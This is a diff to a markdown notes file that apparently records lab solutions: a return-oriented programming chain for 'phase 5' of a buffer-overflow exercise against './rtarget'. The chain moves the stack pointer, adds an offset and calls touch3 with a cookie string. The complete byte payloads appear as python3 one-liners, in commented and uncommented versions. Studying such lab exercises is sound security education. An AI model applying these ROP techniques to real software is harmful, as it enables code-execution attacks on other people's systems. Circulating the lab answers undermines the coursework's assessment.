@@ -41,3 +41,43 @@ Probable approach: use our interesting code bits in our gadgets to pass cookie t
 python3 -c 'import sys; sys.stdout.buffer.write(b"\x90"*40 + b"\xcc\x19\x40"+ b"\x00"*5 + b"\xfa\x97\xb9\x59" + b"\x00"*4 + b"\xa2\x19\x40" + b"\x00"*5 + b"\xec\x17\x40"+b"\x00"*5)' | ./rtarget -q
 
 ## phase 5
+
+Probable approach: move pass cookie address to rdi, then hit touch 3. We'll have to calculate an offset for the cookie address. In more formal terms: move rsp to another register, pop offset (for where string will be stored) from stack and save value in another register, add the two registers together -> put the output into rdi -> call touch 3
+
+^ this approach was right!
+
+comments:
+
+```text
+python3 -c 'import sys; sys.stdout.buffer.write(
+    b"\x90"*40 + # buffer padding
+    b"\x06\x1a\x40"+b"\x00"*5 + # rsp -> rax (stack pointer in rax)
+    b"\xc5\x19\x40"+b"\x00"*5 + # rax -> rdi (this move needs to happen since the only 'popq' widget that's available to use writes to rax. stack pointer in rdi)
+    b"\xab\x19\x40"+b"\x00"*5 + # popq -> rax (eventual offset to stack pointer in rax)
+    b"\x48"+b"\x00"*7 + # value that will be popped from stack and placed in rax
+    b"\x42\x1a\x40"+b"\x00"*5 + # move offset value from eax to edx (a useless testb is performed)
+    b"\x34\x1a\x40"+b"\x00"*5 + # move offset value from edx to ecx ( a useless cmpb is performed)
+    b"\x13\x1a\x40"+b"\x00"*5 + # move offset value from ecx to esi (finally we can take advantage of the lea instruction that's present in one of the widgets)
+    b"\xd6\x19\x40"+b"\x00"*5 + # lea (%rdi,%rsi,1),%rax (so effectively take stack pointer in rdi and add offset of 0x48 to it in rsi and store output in rax)
+    b"\xc5\x19\x40"+b"\x00"*5 + # again, move rax to rdi. rdi will now contain starting address of our string
+    b"\xfa\x18\x40"+b"\x00"*5 + # touch3 address
+    b"\x35\x39\x62\x39\x39\x37\x66\x61\x00")' | ./rtarget -q # cooke with null terminator
+```
+
+no comments:
+
+```text
+python3 -c 'import sys; sys.stdout.buffer.write(
+    b"\x90"*40 +
+    b"\x06\x1a\x40"+b"\x00"*5 + 
+    b"\xc5\x19\x40"+b"\x00"*5 + 
+    b"\xab\x19\x40"+b"\x00"*5 +
+    b"\x48"+b"\x00"*7 + 
+    b"\x42\x1a\x40"+b"\x00"*5 + 
+    b"\x34\x1a\x40"+b"\x00"*5 + 
+    b"\x13\x1a\x40"+b"\x00"*5 + 
+    b"\xd6\x19\x40"+b"\x00"*5 + 
+    b"\xc5\x19\x40"+b"\x00"*5 + 
+    b"\xfa\x18\x40"+b"\x00"*5 + 
+    b"\x35\x39\x62\x39\x39\x37\x66\x61\x00")' | ./rtarget -q
+```
